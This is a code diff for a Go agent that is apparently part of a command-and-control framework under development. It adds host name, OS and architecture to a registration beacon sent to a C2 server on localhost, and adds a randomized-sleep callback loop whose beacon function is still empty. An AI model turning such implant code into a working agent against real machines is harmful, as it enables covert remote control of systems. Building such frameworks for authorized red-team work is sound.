@@ -21,6 +21,9 @@ import (
 var c2URL string = "https://localhost:8443"
 var client *http.Client
 var agentID string
+var hostname string
+var agentOS string
+var agentArch string
 var generator *rand.Rand
 
 func initClient() {
@@ -31,17 +34,20 @@ func initClient() {
 }
 
 func register() error {
-	// get Agent Hostname and OS
+	// get Agent Hostname, OS, and Arch
 	host, err := os.Hostname()
 	if err != nil {
 		return fmt.Errorf("Unable to fetch Hostname: %v", err)
 	}
-	osName := runtime.GOOS
+	hostname = host
+	agentOS = runtime.GOOS
+	agentArch = runtime.GOARCH
 
 	// place data into Beacon struct
 	beacon := proto.Beacon{
-		Hostname: host,
-		OS:       osName,
+		Hostname: hostname,
+		OS:       agentOS,
+		Arch:     agentArch,
 	}
 
 	// prepare and send beacon data to C2
@@ -81,13 +87,17 @@ func register() error {
 }
 
 func initRand() {
-	// make buffer to randomize an int64
+	// randomly generate int64 for seed
 	buff := make([]byte, 8)
 	if _, err := cryptorand.Read(buff); err != nil {
 		log.Fatalf("Error generating random seed: %v", err)
 	}
 	seed := binary.LittleEndian.Uint64(buff)
 	generator = rand.New(rand.NewSource(int64(seed)))
+}
+
+func beacon() error {
+	return nil
 }
 
 func main() {
@@ -103,8 +113,16 @@ func main() {
 	maxSec := 100
 
 	for {
+		// sleep random amount of time
 		timeToSleep := generator.Intn(maxSec-minSec) + 30
 		time.Sleep(time.Duration(timeToSleep) * time.Second)
-		// add beacon() here
+
+		// beacon callout
+		if err := beacon(); err != nil {
+			log.Printf("Could not connect to server: %v", err)
+			continue
+		}
+
+		// post processing things here
 	}
 }
